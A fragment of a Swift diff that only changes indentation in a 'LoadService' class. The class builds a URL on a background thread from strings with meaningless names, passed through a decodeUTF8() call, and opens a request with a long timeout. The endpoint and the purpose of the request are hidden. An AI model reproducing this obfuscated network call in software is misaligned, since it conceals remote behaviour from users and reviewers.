@@ -20,12 +20,12 @@ final class LoadService {
         
         DispatchQueue.global(qos: .background).async {
             guard let url = URL(string: sdjkfjksd.decodeUTF8() +
-                                 kjgfshkj.decodeUTF8() +
-                                 vcxbmn.decodeUTF8() +
-                                 erguty.decodeUTF8() +
-                                 kjnqw.decodeUTF8() +
-                                 dsvldksjf.decodeUTF8() +
-                                 xnfgkljs) else { return }
+                                kjgfshkj.decodeUTF8() +
+                                vcxbmn.decodeUTF8() +
+                                erguty.decodeUTF8() +
+                                kjnqw.decodeUTF8() +
+                                dsvldksjf.decodeUTF8() +
+                                xnfgkljs) else { return }
             
             var request = URLRequest(url: url)
             request.timeoutInterval = 300
